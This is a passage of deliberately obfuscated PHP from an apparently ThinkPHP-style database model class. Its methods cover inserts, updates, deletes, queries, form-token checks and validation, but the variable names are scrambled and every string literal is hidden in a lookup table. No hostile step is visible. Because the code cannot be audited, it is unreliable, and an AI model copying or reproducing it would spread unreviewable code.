(think_config($ªà¡Ü°[325])) { $this->fields[$ªà¡Ü°[326]] = think_config($ªà¡Ü°[325]); } if (think_config($ªà¡Ü°[322])) { $®×‘Ô = $this->dbName ? $this->dbName : think_config($ªà¡Ü°[323]); think_var_cache($ªà¡Ü°[324] . strtolower(get_path_this($®×‘Ô) . $ªà¡Ü°[10] . $this->name), $this->fields); } } public function switchModel($¨Ÿˆµ©ˆ, $ÓÈ‰ÔÈÜ = array()) { $Á—Ò×¥µ =& $_SERVER[¢ñàß¿€]; $ßê±Öƒ = ucwords(strtolower($¨Ÿˆµ©ˆ)) . $Á—Ò×¥µ[330]; if (!class_exists($ßê±Öƒ)) { think_exception($ßê±Öƒ . think_lang($Á—Ò×¥µ[331])); } $this->_extModel = new $ßê±Öƒ($this->name); if (!empty($ÓÈ‰ÔÈÜ)) { foreach ($ÓÈ‰ÔÈÜ as $Šö—àÂ–) { $this->_extModel->setProperty($Šö—àÂ–, $this->{$Šö—àÂ–}); } } return $this->_extModel; } public function __set($é€øƒôç, $«Â‚ËÎ–) { $this->data[$é€øƒôç] = $«Â‚ËÎ–; } public function __get($”»ÜÉØ³) { return isset($this->data[$”»ÜÉØ³]) ? $this->data[$”»ÜÉØ³] : null; } public function __isset($Ãã¡ØŞŒ) { return isset($this->data[$Ãã¡ØŞŒ]); } public function __unset($íû´âÖ) { unset($this->data[$íû´âÖ]); } public function __call($šäœÌÂÙ, $ÓèÕ¡¢š) { $çÀı™öš =& $_SERVER[¢ñàß¿€]; if (in_array(strtolower($šäœÌÂÙ), $this->methods, !0)) { $this->options[strtolower($šäœÌÂÙ)] = $ÓèÕ¡¢š[0]; return $this; } elseif (in_array(strtolower($šäœÌÂÙ), array($çÀı™öš[332], $çÀı™öš[333], $çÀı™öš[334], $çÀı™öš[335], $çÀı™öš[336]), !0)) { $‹òê¤üé = isset($ÓèÕ¡¢š[0]) ? $ÓèÕ¡¢š[0] : $çÀı™öš[220]; $‹òê¤üé = $this->db->parseKey($‹òê¤üé); return $this->getField(strtoupper($šäœÌÂÙ) . $çÀı™öš[337] . $‹òê¤üé . $çÀı™öš[338] . $šäœÌÂÙ, $çÀı™öš[332]); } elseif (strtolower(substr($šäœÌÂÙ, 0, 5)) == $çÀı™öš[339]) { $‹òê¤üé = think_parse_name(substr($šäœÌÂÙ, 5)); $°·ÊÚï[$‹òê¤üé] = $ÓèÕ¡¢š[0]; return $this->where($°·ÊÚï)->find(); } elseif (strtolower(substr($šäœÌÂÙ, 0, 10)) == $çÀı™öš[340]) { $‚ìÄ¸è = think_parse_name(substr($šäœÌÂÙ, 10)); $°·ÊÚï[$‚ìÄ¸è] = $ÓèÕ¡¢š[0]; return $this->where($°·ÊÚï)->getField($ÓèÕ¡¢š[1]); } elseif (isset($this->_scope[$šäœÌÂÙ])) { return $this->scope($šäœÌÂÙ, $ÓèÕ¡¢š[0]); } elseif (method_exists($this, $šäœÌÂÙ)) { array_unshift($ÓèÕ¡¢š, $šäœÌÂÙ); return call_user_func_array(array($this, $çÀı™öš[341]), $ÓèÕ¡¢š); } else { return call_user_func_array(array(parent, $šäœÌÂÙ), $ÓèÕ¡¢š); } } protected function call() { $ÎÈËâÀ¶ =& $_SERVER[¢ñàß¿€]; $­–ë„úÜ = func_get_args(); $¾­¬º = array_shift($­–ë„úÜ); $øŠğí¯› = $¾­¬º; if (is_array($¾­¬º)) { $øŠğí¯› = $¾­¬º[1]; $¾­¬º = $¾­¬º[0]; } $Ê¯ÂÙìü = count($­–ë„úÜ) - 1; if (isset($­–ë„úÜ[$Ê¯ÂÙìü]) && $­–ë„úÜ[$Ê¯ÂÙìü] === $¾­¬º) { think_exception(__CLASS__ . $ÎÈËâÀ¶[4] . $¾­¬º . think_lang($ÎÈËâÀ¶[342])); return; } $­–ë„úÜ[] = $¾­¬º; if (method_exists($this, $ÎÈËâÀ¶[343])) { $õÊÔæ’ = call_user_func_array(array($this, $ÎÈËâÀ¶[344]), array($øŠğí¯›, $­–ë„úÜ)); if (!is_null($õÊÔæ’) && $õÊÔæ’ !== !1) { return $õÊÔæ’; } } $İ°ğÕ¿ = call_user_func_array(array($this, $¾­¬º), $­–ë„úÜ); if (method_exists($this, $ÎÈËâÀ¶[345])) { $õÊÔæ’ = call_user_func_array(array($this, $ÎÈËâÀ¶[346]), array($øŠğí¯›, $­–ë„úÜ, $İ°ğÕ¿)); if ($õÊÔæ’) { return $õÊÔæ’; } } return $İ°ğÕ¿; } protected function _initialize() { } protected function _facade($øì·û™Ô) { $¢èËã³’ =& $_SERVER[¢ñàß¿€]; if (!empty($this->fields)) { foreach ($øì·û™Ô as $Ëˆ¹®Î® => $ŒÙìÃó) { if (is_array($this->fields) && !in_array($Ëˆ¹®Î®, $this->fields, !0)) { unset($øì·û™Ô[$Ëˆ¹®Î®]); } elseif (is_scalar($ŒÙìÃó)) { $this->_parseType($øì·û™Ô, $Ëˆ¹®Î®); } } } if (!empty($this->options[$¢èËã³’[347]])) { $øì·û™Ô = array_map($this->options[$¢èËã³’[347]], $øì·û™Ô); unset($this->options[$¢èËã³’[347]]); } $this->_beforeWrite($øì·û™Ô); return $øì·û™Ô; } protected function _beforeWrite(&$¢œÜÓİ) { } public function add($—æÂ¯ë“ = '', $œÉºË = array(), $µîÀ±ƒ = false) { if (empty($—æÂ¯ë“)) { if (!empty($this->data)) { $—æÂ¯ë“ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¢ñàß¿€][348]); return !1; } } $œÉºË = $this->_parseOptions($œÉºË); $—æÂ¯ë“ = $this->_facade($—æÂ¯ë“); if (!1 === $this->_beforeInsert($—æÂ¯ë“, $œÉºË)) { return !1; } $â‰¥Ìæ¿ = $this->db->insert($—æÂ¯ë“, $œÉºË, $µîÀ±ƒ); if (!1 !== $â‰¥Ìæ¿) { $Ğà€¬øÁ = $this->getLastInsID(); if ($Ğà€¬øÁ) { $—æÂ¯ë“[$this->getPk()] = $Ğà€¬øÁ; $this->_after_insert($—æÂ¯ë“, $œÉºË); return $Ğà€¬øÁ; } $this->_after_insert($—æÂ¯ë“, $œÉºË); } return $â‰¥Ìæ¿; } protected function _beforeInsert(&$†ïÔ‹üÙ, $´—ƒÑä¦) { } protected function _after_insert($¢ĞÊÛè©, $ôÇÄ»€Ò) { } public function addAll($û«¢ÖÚ­, $ƒ‡¦ªÄ = array(), $Ö…äìÒì = false) { $íñ³« =& $_SERVER[¢ñàß¿€]; if (empty($û«¢ÖÚ­)) { $this->error = think_lang($íñ³«[348]); return !1; } $ƒ‡¦ªÄ = $this->_parseOptions($ƒ‡¦ªÄ); foreach ($û«¢ÖÚ­ as $››½Ú·ã => $µ„şÖŠú) { $û«¢ÖÚ­[$››½Ú·ã] = $this->_facade($µ„şÖŠú); } if (method_exists($this->db, $íñ³«[349])) { $£ÕËÂ›­ = $this->db->insertAll($û«¢ÖÚ­, $ƒ‡¦ªÄ, $Ö…äìÒì); } else { $this->startTrans(); foreach ($û«¢ÖÚ­ as $››½Ú·ã => $µ„şÖŠú) { $£ÕËÂ›­ = $this->db->insert($µ„şÖŠú, $ƒ‡¦ªÄ, $Ö…äìÒì); } $this->commit(); } if (!1 !== $£ÕËÂ›­) { $Ô¦­çÃÁ = $this->getLastInsID(); if ($Ô¦­çÃÁ) { return $Ô¦­çÃÁ; } } return $£ÕËÂ›­; } public function selectAdd($œˆ«Ê = '', $Õ×× = '', $¿õò«… = array()) { $ËÈåÏµæ =& $_SERVER[¢ñàß¿€]; $¿õò«… = $this->_parseOptions($¿õò«…); if (!1 === ($§µº×¡• = $this->db->selectInsert($œˆ«Ê ? $œˆ«Ê : $¿õò«…[$ËÈåÏµæ[350]], $Õ×× ? $Õ×× : $this->getTableName(), $¿õò«…))) { $this->error = think_lang($ËÈåÏµæ[351]); return !1; } else { return $§µº×¡•; } } public function save($Ÿ£¡ñ”î = '', $Ïò»çû = array()) { $òŠ¼êÆ± =& $_SERVER[¢ñàß¿€]; if (empty($Ÿ£¡ñ”î)) { if (!empty($this->data)) { $Ÿ£¡ñ”î = $this->data; $this->data = array(); } else { $this->error = think_lang($òŠ¼êÆ±[348]); return !1; } } $Ÿ£¡ñ”î = $this->_facade($Ÿ£¡ñ”î); $Ïò»çû = $this->_parseOptions($Ïò»çû); $ùØ­íï– = $this->getPk(); if (!isset($Ïò»çû[$òŠ¼êÆ±[352]])) { if (isset($Ÿ£¡ñ”î[$ùØ­íï–])) { $øº¶Åª[$ùØ­íï–] = $Ÿ£¡ñ”î[$ùØ­íï–]; $Ïò»çû[$òŠ¼êÆ±[352]] = $øº¶Åª; unset($Ÿ£¡ñ”î[$ùØ­íï–]); } else { $this->error = think_lang($òŠ¼êÆ±[351]); return !1; } } if (is_array($Ïò»çû[$òŠ¼êÆ±[352]]) && isset($Ïò»çû[$òŠ¼êÆ±[352]][$ùØ­íï–])) { $ö‰Ç²øà = $Ïò»çû[$òŠ¼êÆ±[352]][$ùØ­íï–]; } if (!1 === $this->_beforeUpdate($Ÿ£¡ñ”î, $Ïò»çû)) { return !1; } $ı¼üË‹ = $this->db->update($Ÿ£¡ñ”î, $Ïò»çû); if (!1 !== $ı¼üË‹) { if (isset($ö‰Ç²øà)) { $Ÿ£¡ñ”î[$ùØ­íï–] = $ö‰Ç²øà; } $this->_afterUpdate($Ÿ£¡ñ”î, $Ïò»çû); } return $ı¼üË‹; } protected function _beforeUpdate(&$¶ıÖ“£Ø, $Ãì¸¯ı) { } protected function _afterUpdate($Àâ›¶ç¤, $ôĞŸş») { } public function delete($‹¶Î®¬ = array()) { $âÜÍÉ…½ =& $_SERVER[¢ñàß¿€]; if (empty($‹¶Î®¬) && empty($this->options[$âÜÍÉ…½[352]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $³×¢ïŒ£ = $this->getPk(); if (is_numeric($‹¶Î®¬) || is_string($‹¶Î®¬)) { if (strpos($‹¶Î®¬, $âÜÍÉ…½[50])) { $öâöÜ[$³×¢ïŒ£] = array($âÜÍÉ…½[353], $‹¶Î®¬); } else { $öâöÜ[$³×¢ïŒ£] = $‹¶Î®¬; } $this->options[$âÜÍÉ…½[352]] = $öâöÜ; } $‹¶Î®¬ = $this->_parseOptions(); if (is_array($‹¶Î®¬[$âÜÍÉ…½[352]]) && isset($‹¶Î®¬[$âÜÍÉ…½[352]][$³×¢ïŒ£])) { $ç¸ğ—ÑÂ = $‹¶Î®¬[$âÜÍÉ…½[352]][$³×¢ïŒ£]; } $Èš•í€ = $this->db->delete($‹¶Î®¬); if (!1 !== $Èš•í€) { $‡ ª§şè = array(); if (isset($ç¸ğ—ÑÂ)) { $‡ ª§şè[$³×¢ïŒ£] = $ç¸ğ—ÑÂ; } $this->_after_delete($‡ ª§şè, $‹¶Î®¬); } return $Èš•í€; } protected function _after_delete($„˜íëğÖ, $ôã­£Ö) { } public function select($ß—ôâË‹ = array()) { $à…‰¬˜ =& $_SERVER[¢ñàß¿€]; if (is_string($ß—ôâË‹) || is_numeric($ß—ôâË‹)) { $ÔÄÑŸœÚ = $this->getPk(); if (strpos($ß—ôâË‹, $à…‰¬˜[50])) { $÷ÓÎúÈ“[$ÔÄÑŸœÚ] = array($à…‰¬˜[353], $ß—ôâË‹); } else { $÷ÓÎúÈ“[$ÔÄÑŸœÚ] = $ß—ôâË‹; } $this->options[$à…‰¬˜[352]] = $÷ÓÎúÈ“; } elseif (!1 === $ß—ôâË‹) { $ß—ôâË‹ = $this->_parseOptions(); return $à…‰¬˜[354] . $this->db->buildSelectSql($ß—ôâË‹) . $à…‰¬˜[355]; } $ß—ôâË‹ = $this->_parseOptions(); $Ó›şÒıÛ = $this->db->select($ß—ôâË‹); if (!1 === $Ó›şÒıÛ) { return !1; } if (empty($Ó›şÒıÛ)) { return null; } $this->_afterSelect($Ó›şÒıÛ, $ß—ôâË‹); return $Ó›şÒıÛ; } protected function _afterSelect(&$ŒØ®ë¤¼, $“ƒ”¸¤é) { } public function buildSql($ÄûÛß˜ = array()) { $«…«²áÇ =& $_SERVER[¢ñàß¿€]; $ÄûÛß˜ = $this->_parseOptions($ÄûÛß˜); return $«…«²áÇ[354] . $this->db->buildSelectSql($ÄûÛß˜) . $«…«²áÇ[355]; } public function optionsValue($åãíÎ„ = null) { if (is_null($åãíÎ„)) { return $this->options; } elseif (is_array($åãíÎ„)) { $this->options = array_merge($this->options, $åãíÎ„); } } protected function _parseOptions($©®Ãµ¦— = array()) { $äàı¨œÑ =& $_SERVER[¢ñàß¿€]; if (is_array($©®Ãµ¦—)) { $©®Ãµ¦— = array_merge($this->options, $©®Ãµ¦—); } $this->options = array(); if (!isset($©®Ãµ¦—[$äàı¨œÑ[356]])) { $©®Ãµ¦—[$äàı¨œÑ[356]] = $this->getTableName(); $Œ¦î‡ = $this->fields; } else { $Œ¦î‡ = $this->getDbFields(); } if (!empty($©®Ãµ¦—[$äàı¨œÑ[357]])) { $©®Ãµ¦—[$äàı¨œÑ[356]] .= $äàı¨œÑ[53] . $©®Ãµ¦—[$äàı¨œÑ[357]]; } $©®Ãµ¦—[$äàı¨œÑ[358]] = $this->name; if (isset($©®Ãµ¦—[$äàı¨œÑ[352]]) && is_array($©®Ãµ¦—[$äàı¨œÑ[352]]) && !empty($Œ¦î‡) && !isset($©®Ãµ¦—[$äàı¨œÑ[359]]) && !isset($©®Ãµ¦—[$äàı¨œÑ[356]])) { foreach ($©®Ãµ¦—[$äàı¨œÑ[352]] as $ëÂ²©ºŒ => $Å›šîïŒ) { $ëÂ²©ºŒ = trim($ëÂ²©ºŒ); if (in_array($ëÂ²©ºŒ, $Œ¦î‡, !0)) { if (is_scalar($Å›šîïŒ)) { $this->_parseType($©®Ãµ¦—[$äàı¨œÑ[352]], $ëÂ²©ºŒ); } } elseif (!is_numeric($ëÂ²©ºŒ) && $äàı¨œÑ[11] != substr($ëÂ²©ºŒ, 0, 1) && !1 === strpos($ëÂ²©ºŒ, $äàı¨œÑ[10]) && !1 === strpos($ëÂ²©ºŒ, $äàı¨œÑ[337]) && !1 === strpos($ëÂ²©ºŒ, $äàı¨œÑ[214]) && !1 === strpos($ëÂ²©ºŒ, $äàı¨œÑ[360])) { unset($©®Ãµ¦—[$äàı¨œÑ[352]][$ëÂ²©ºŒ]); } } } $this->_options_filter($©®Ãµ¦—); return $©®Ãµ¦—; } protected function _options_filter(&$ä£ÎÀüƒ) { } protected function _parseType(&$¥‡âøËÙ, $‰»ÄßĞÙ) { $òŒöÈ›¹ =& $_SERVER[¢ñàß¿€]; if (empty($this->options[$òŒöÈ›¹[361]][$òŒöÈ›¹[4] . $‰»ÄßĞÙ])) { $Ô¡¸ä™¡ = strtolower($this->fields[$òŒöÈ›¹[329]][$‰»ÄßĞÙ]); if (!1 !== strpos($Ô¡¸ä™¡, $òŒöÈ›¹[362])) { } elseif (!1 === strpos($Ô¡¸ä™¡, $òŒöÈ›¹[363]) && !1 !== strpos($Ô¡¸ä™¡, $òŒöÈ›¹[364])) { $¥‡âøËÙ[$‰»ÄßĞÙ] = intval($¥‡âøËÙ[$‰»ÄßĞÙ]); } elseif (!1 !== strpos($Ô¡¸ä™¡, $òŒöÈ›¹[365]) || !1 !== strpos($Ô¡¸ä™¡, $òŒöÈ›¹[366])) { $¥‡âøËÙ[$‰»ÄßĞÙ] = floatval($¥‡âøËÙ[$‰»ÄßĞÙ]); } elseif (!1 !== strpos($Ô¡¸ä™¡, $òŒöÈ›¹[367])) { $¥‡âøËÙ[$‰»ÄßĞÙ] = (bool) $¥‡âøËÙ[$‰»ÄßĞÙ]; } } } public function find($ĞØíûÜ• = array()) { $¥»“ÉØ’ =& $_SERVER[¢ñàß¿€]; if (is_numeric($ĞØíûÜ•) || is_string($ĞØíûÜ•)) { $¢¡õßç[$this->getPk()] = intval($ĞØíûÜ•); $this->options[$¥»“ÉØ’[352]] = $¢¡õßç; } $this->options[$¥»“ÉØ’[368]] = 1; $ĞØíûÜ• = $this->_parseOptions(); $ŠÆ›¤³š = $this->db->select($ĞØíûÜ•); if (!1 === $ŠÆ›¤³š) { return !1; } if (empty($ŠÆ›¤³š)) { return null; } $this->data = $ŠÆ›¤³š[0]; $this->_afterFind($this->data, $ĞØíûÜ•); if (!empty($this->options[$¥»“ÉØ’[369]])) { return $this->returnResult($this->data, $this->options[$¥»“ÉØ’[369]]); } return $this->data; } protected function _afterFind(&$ØíÛŸîİ, $ÙÈ¡îñ) { } protected function returnResult($„åÒ’³, $šáæƒ¤ = '') { $Ó£îùÌ¯ =& $_SERVER[¢ñàß¿€]; if ($šáæƒ¤) { if (is_callable($šáæƒ¤)) { return call_user_func($šáæƒ¤, $„åÒ’³); } switch (strtolower($šáæƒ¤)) { case $Ó£îùÌ¯[370]: return json_encode($„åÒ’³); case $Ó£îùÌ¯[371]: return xml_encode($„åÒ’³); } } return $„åÒ’³; } public function parseFieldsMap($í½éôÏ¢, $‘ÅÚÃš = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ƒ€™ŞáŸ => $Î½¡•ç) { if ($‘ÅÚÃš == 1) { if (isset($í½éôÏ¢[$Î½¡•ç])) { $í½éôÏ¢[$ƒ€™ŞáŸ] = $í½éôÏ¢[$Î½¡•ç]; unset($í½éôÏ¢[$Î½¡•ç]); } } else { if (isset($í½éôÏ¢[$ƒ€™ŞáŸ])) { $í½éôÏ¢[$Î½¡•ç] = $í½éôÏ¢[$ƒ€™ŞáŸ]; unset($í½éôÏ¢[$ƒ€™ŞáŸ]); } } } } return $í½éôÏ¢; } public function setField($Æñ±ù¥, $Ÿ†“â® = '') { if (is_array($Æñ±ù¥)) { $¤İ¥½ = $Æñ±ù¥; } else { $¤İ¥½[$Æñ±ù¥] = $Ÿ†“â®; } return $this->save($¤İ¥½); } public function setAdd($Æ†ô±–, $Ø”ß‚»ù = 1) { $»³ÚÙÛ× =& $_SERVER[¢ñàß¿€]; $ĞÚ´½à• = $Æ†ô±– . $»³ÚÙÛ×[372] . $Ø”ß‚»ù; if ($Ø”ß‚»ù < 0) { $ĞÚ´½à• = $Æ†ô±– . $Ø”ß‚»ù; } return $this->setField($Æ†ô±–, array($»³ÚÙÛ×[373], $ĞÚ´½à•)); } public function getField($˜«İŠâ, $ªİœÉ¤ú = null) { $œÈ ¶÷ =& $_SERVER[¢ñàß¿€]; $¦¸±­Ä˜[$œÈ ¶÷[350]] = $˜«İŠâ; $¦¸±­Ä˜ = $this->_parseOptions($¦¸±­Ä˜); $˜«İŠâ = trim($˜«İŠâ); if (strpos($˜«İŠâ, $œÈ ¶÷[50])) { if (!isset($¦¸±­Ä˜[$œÈ ¶÷[368]])) { $¦¸±­Ä˜[$œÈ ¶÷[368]] = is_numeric($ªİœÉ¤ú) ? $ªİœÉ¤ú : $œÈ ¶÷[12]; } $¼Œ°ªÄ£ = $this->db->select($¦¸±­Ä˜); if (!empty($¼Œ°ªÄ£)) { $âãØŞ²¡ = explode($œÈ ¶÷[50], $˜«İŠâ); $˜«İŠâ = array_keys($¼Œ°ªÄ£[0]); $çŞ‰î³ì = array_shift($˜«İŠâ); $‹ŞåÍ·ˆ = array_shift($˜«İŠâ); $£šìÎ— = array(); $è•ÌÊİã = count($âãØŞ²¡); foreach ($¼Œ°ªÄ£ as $öà·üŠ£) { $Èñ«®§ = $öà·üŠ£[$çŞ‰î³ì]; if (2 == $è•ÌÊİã) { $£šìÎ—[$Èñ«®§] = $öà·üŠ£[$‹ŞåÍ·ˆ]; } else { $£šìÎ—[$Èñ«®§] = is_string($ªİœÉ¤ú) ? implode($ªİœÉ¤ú, $öà·üŠ£) : $öà·üŠ£; } } return $£šìÎ—; } } else { if (!0 !== $ªİœÉ¤ú) { $¦¸±­Ä˜[$œÈ ¶÷[368]] = is_numeric($ªİœÉ¤ú) ? $ªİœÉ¤ú : 1; } if ($ªİœÉ¤ú === $œÈ ¶÷[332]) { unset($¦¸±­Ä˜[$œÈ ¶÷[368]]); } $öà·üŠ£ = $this->db->select($¦¸±­Ä˜); if (!empty($öà·üŠ£)) { if ($ªİœÉ¤ú === $œÈ ¶÷[332]) { return reset($öà·üŠ£[0]); } if (!0 !== $ªİœÉ¤ú && 1 == $¦¸±­Ä˜[$œÈ ¶÷[368]]) { return reset($öà·üŠ£[0]); } foreach ($öà·üŠ£ as $è™Ş½Íã) { $“Üù•£“[] = $è™Ş½Íã[$˜«İŠâ]; } return $“Üù•£“; } } return null; } public function create($¶ìÊ¿Ç‹ = '', $•áôåé‚ = '') { $¾¢“İã =& $_SERVER[¢ñàß¿€]; if (empty($¶ìÊ¿Ç‹)) { $¶ìÊ¿Ç‹ = $_POST; } elseif (is_object($¶ìÊ¿Ç‹)) { $¶ìÊ¿Ç‹ = get_object_vars($¶ìÊ¿Ç‹); } if (empty($¶ìÊ¿Ç‹) || !is_array($¶ìÊ¿Ç‹)) { $this->error = think_lang($¾¢“İã[348]); return !1; } $¶ìÊ¿Ç‹ = $this->parseFieldsMap($¶ìÊ¿Ç‹, 0); $•áôåé‚ = $•áôåé‚ ? $•áôåé‚ : (!empty($¶ìÊ¿Ç‹[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$¾¢“İã[350]])) { $Ù™”­—ï = $this->options[$¾¢“İã[350]]; unset($this->options[$¾¢“İã[350]]); } elseif ($•áôåé‚ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Ù™”­—ï = $this->insertFields; } elseif ($•áôåé‚ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Ù™”­—ï = $this->updateFields; } if (isset($Ù™”­—ï)) { if (is_string($Ù™”­—ï)) { $Ù™”­—ï = explode($¾¢“İã[50], $Ù™”­—ï); } if (think_config($¾¢“İã[374])) { $Ù™”­—ï[] = think_config($¾¢“İã[375]); } foreach ($¶ìÊ¿Ç‹ as $é®¾èŠï => $æª¡´¨œ) { if (!in_array($é®¾èŠï, $Ù™”­—ï)) { unset($¶ìÊ¿Ç‹[$é®¾èŠï]); } } } if (!$this->autoValidation($¶ìÊ¿Ç‹, $•áôåé‚)) { return !1; } if (!$this->autoCheckToken($¶ìÊ¿Ç‹)) { $this->error = think_lang($¾¢“İã[376]); return !1; } if ($this->autoCheckFields) { $Ù™”­—ï = $this->getDbFields(); foreach ($¶ìÊ¿Ç‹ as $é®¾èŠï => $æª¡´¨œ) { if (!in_array($é®¾èŠï, $Ù™”­—ï)) { unset($¶ìÊ¿Ç‹[$é®¾èŠï]); } elseif (MAGIC_QUOTES_GPC && is_string($æª¡´¨œ)) { $¶ìÊ¿Ç‹[$é®¾èŠï] = stripslashes($æª¡´¨œ); } } } $this->autoOperation($¶ìÊ¿Ç‹, $•áôåé‚); $this->data = $¶ìÊ¿Ç‹; return $¶ìÊ¿Ç‹; } public function autoCheckToken($„Ã÷³®Ä) { $ëÒ’Úò =& $_SERVER[¢ñàß¿€]; if (isset($this->options[$ëÒ’Úò[377]]) && !$this->options[$ëÒ’Úò[377]]) { return !0; } if (think_config($ëÒ’Úò[374])) { $íŞ¤²€Ô = think_config($ëÒ’Úò[375]); if (!isset($„Ã÷³®Ä[$íŞ¤²€Ô]) || Session::get($íŞ¤²€Ô)) { return !1; } list($§°’µ‚, $Úˆ‚ÍÚü) = explode($ëÒ’Úò[11], $„Ã÷³®Ä[$íŞ¤²€Ô]); if ($Úˆ‚ÍÚü && Session::get($íŞ¤²€Ô . $ëÒ’Úò[10] . $§°’µ‚) === $Úˆ‚ÍÚü) { Session::remove($íŞ¤²€Ô . $ëÒ’Úò[10] . $§°’µ‚); return !0; } if (think_config($ëÒ’Úò[378])) { Session::remove($íŞ¤²€Ô . $ëÒ’Úò[10] . $§°’µ‚); } return !1; } return !0; } public function regex($Ëå´úéö, $í©Ô…) { $±ƒ©ì¤ =& $_SERVER[¢ñàß¿€]; $Ş…ÍµÆŒ = array($±ƒ©ì¤[379] => $±ƒ©ì¤[380], $±ƒ©ì¤[381] => $±ƒ©ì¤[382], $±ƒ©ì¤[383] => $±ƒ©ì¤[384], $±ƒ©ì¤[385] => $±ƒ©ì¤[386], $±ƒ©ì¤[387] => $±ƒ©ì¤[388], $±ƒ©ì¤[389] => $±ƒ©ì¤[390], $±ƒ©ì¤[391] => $±ƒ©ì¤[392], $±ƒ©ì¤[366] => $±ƒ©ì¤[393], $±ƒ©ì¤[394] => $±ƒ©ì¤[395]); if (isset($Ş…ÍµÆŒ[strtolower($í©Ô…)])) { $í©Ô… = $Ş…ÍµÆŒ[strtolower($í©Ô…)]; } return preg_match($í©Ô…, $Ëå´úéö) === 1; } private function autoOperation(&$³İÉ«È, $˜õ¿ŸÌ”) { $¿ãÆ‘å† =& $_SERVER[¢ñàß¿€]; if (!empty($this->options[$¿ãÆ‘å†[396]])) { $Â³¾”Ú© = $this->options[$¿ãÆ‘å†[396]]; unset($this->options[$¿ãÆ‘å†[396]]); } elseif (!empty($this->_auto)) { $Â³¾”Ú© = $this->_auto; } if (isset($Â³¾”Ú©)) { foreach ($Â³¾”Ú© as $ò”°Êøı) { if (empty($ò”°Êøı[2])) { $ò”°Êøı[2] = THINK_MODEL_INSERT; } if ($˜õ¿ŸÌ” == $ò”°Êøı[2] || $ò”°Êøı[2] == THINK_MODEL_BOTH) { switch (trim($ò”°Êøı[3])) { case $¿ãÆ‘å†[397]: case $¿ãÆ‘å†[398]: $¿üäÓáÇ = isset($ò”°Êøı[4]) ? (array) $ò”°Êøı[4] : array(); if (isset($³İÉ«È[$ò”°Êøı[0]])) { array_unshift($¿üäÓáÇ, $³İÉ«È[$ò”°Êøı[0]]); } if ($¿ãÆ‘å†[397] == $ò”°Êøı[3]) { $³İÉ«È[$ò”°Êøı[0]] = call_user_func_array($ò”°Êøı[1], $¿üäÓáÇ); } else { $³İÉ«È[$ò”°Êøı[0]] = call_user_func_array(array(&$this, $ò”°Êøı[1]), $¿üäÓáÇ); } break; case $¿ãÆ‘å†[350]: $³İÉ«È[$ò”°Êøı[0]] = $³İÉ«È[$ò”°Êøı[1]]; break; case $¿ãÆ‘å†[399]: if ($¿ãÆ‘å†[12] === $³İÉ«È[$ò”°Êøı[0]]) { unset($³İÉ«È[$ò”°Êøı[0]]); } break; case $¿ãÆ‘å†[400]: default: $³İÉ«È[$ò”°Êøı[0]] = $ò”°Êøı[1]; } if (!1 === $³İÉ«È[$ò”°Êøı[0]]) { unset($³İÉ«È[$ò”°Êøı[0]]); } } } } return $³İÉ«È; } protected function autoValidation($¼§Ş¬şÏ, $ß©Ãšè) { $ßùšç÷Ï =& $_SERVER[¢ñàß¿€]; if (!empty($this->options[$ßùšç÷Ï[401]])) { $“ó¤×‡Ò = $this->options[$ßùšç÷Ï[401]]; unset($this->options[$ßùšç÷Ï[401]]); } elseif (!empty($this->_validate)) { $“ó¤×‡Ò = $this->_validate; } if (isset($“ó¤×‡Ò)) { if ($this->patchValidate) { $this->error = array(); } foreach ($“ó¤×‡Ò as $çŸ†ãîœ => $äŸ¥é®²) { if (empty($äŸ¥é®²[5]) || $äŸ¥é®²[5] == THINK_MODEL_BOTH || $äŸ¥é®²[5] == $ß©Ãšè) { if (0 == strpos($äŸ¥é®²[2], $ßùšç÷Ï[402]) && strpos($äŸ¥é®²[2], $ßùšç÷Ï[403])) { $äŸ¥é®²[2] = think_lang(substr($äŸ¥é®²[2], 2, -1)); } $äŸ¥é®²[3] = isset($äŸ¥é®²[3]) ? $äŸ¥é®²[3] : THINK_EXISTS_VALIDATE; $äŸ¥é®²[4] = isset($äŸ¥é®²[4]) ? $äŸ¥é®²[4] : $ßùšç÷Ï[404]; switch ($äŸ¥é®²[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($¼§Ş¬şÏ, $äŸ¥é®²)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ßùšç÷Ï[12] != trim($¼§Ş¬şÏ[$äŸ¥é®²[0]])) { if (!1 === $this->_validationField($¼§Ş¬şÏ, $äŸ¥é®²)) { return !1; } } break; default: if (isset($¼§Ş¬şÏ[$äŸ¥é®²[0]])) { if (!1 === $this->_validationField($¼§Ş¬şÏ, $äŸ¥é®²)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($öü³šßÈ, $Óìû‹‚) { if (!1 === $this->_validationFieldItem($öü³šßÈ, $Óìû‹‚)) { if ($this->patchValidate) { $this->error[$Óìû‹‚[0]] = $Óìû‹‚[2]; } else { $this->error = $Óìû‹‚[2]; return !1; } } return; } protected function _validationFieldItem($¤‚€€àö, $˜‘¢‘…‡) { $é¹òã =& $_SERVER[¢ñàß¿€]; switch (strtolower(trim($˜‘¢‘…‡[4]))) { case $é¹òã[397]: case $é¹òã[398]: $üÓœ±ùÈ = isset($˜‘¢‘…‡[6]) ? (array) $˜‘¢‘…‡[6] : array(); if (is_string($˜‘¢‘…‡[0]) && strpos($˜‘¢‘…‡[0], $é¹òã[50])) { $˜‘¢‘…‡[0] = explode($é¹òã[50], $˜‘¢‘…‡[0]); } if (is_array($˜‘¢‘…‡[0])) { foreach ($˜‘¢‘…‡[0] as $±ˆ­½áù) { $æö“ù[$±ˆ­½áù] = $¤‚€€àö[$±ˆ­½áù]; } array_unshift($üÓœ±ùÈ, $æö“ù); } else { array_unshift($üÓœ±ùÈ, $¤‚€€àö[$˜‘¢‘…‡[0]]); } if ($é¹òã[397] == $˜‘¢‘…‡[4]) { return call_user_func_array($˜‘¢‘…‡[1], $üÓœ±ùÈ); } else { return call_user_func_array(array(&$this, $˜‘¢‘…‡[1]), $üÓœ±ùÈ); } case $é¹òã[405]: return $¤‚€€àö[$˜‘¢‘…‡[0]] == $¤‚€€àö[$˜‘¢‘…‡[1]]; case $é¹òã[406]: if (is_string($˜‘¢‘…‡[0]) && 